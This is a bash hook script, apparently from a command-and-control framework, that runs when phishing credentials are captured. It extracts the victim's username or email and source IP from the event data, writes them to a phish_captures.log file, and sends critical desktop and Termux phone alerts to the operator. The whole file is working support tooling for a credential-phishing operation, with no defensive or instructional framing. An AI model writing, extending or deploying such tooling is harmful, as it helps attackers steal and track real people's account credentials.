#!/bin/bash
# Hook: Alert + store on phishing credential capture
# Matches: cred/* events

case "$C2_EVENT" in
  cred.phish_capture|cred.stored|cred/phish_capture)
    ;;
  *)
    exit 0
    ;;
esac

MSG="CREDENTIAL CAPTURED: $(echo "$C2_DATA" | python3 -c "import sys,json; d=json.loads(sys.stdin.read()); print(f\"{d.get('username',d.get('email','?'))}@{d.get('src_ip','?')}\")" 2>/dev/null || echo "$C2_DATA" | head -c 120)"
echo "[$C2_TIMESTAMP] $MSG" >> "$C2_HOME/logs/phish_captures.log"

# Desktop notification
if command -v notify-send &>/dev/null; then
  notify-send -u critical "Phish Capture!" "$MSG" 2>/dev/null
fi

# Termux notification
if [ -d "/data/data/com.termux" ]; then
  termux-notification --title "PHISH CAPTURE" --content "$MSG" \
    --priority max --vibrate 300,200,300 --led-color ff8800 --group c2phish 2>/dev/null
fi
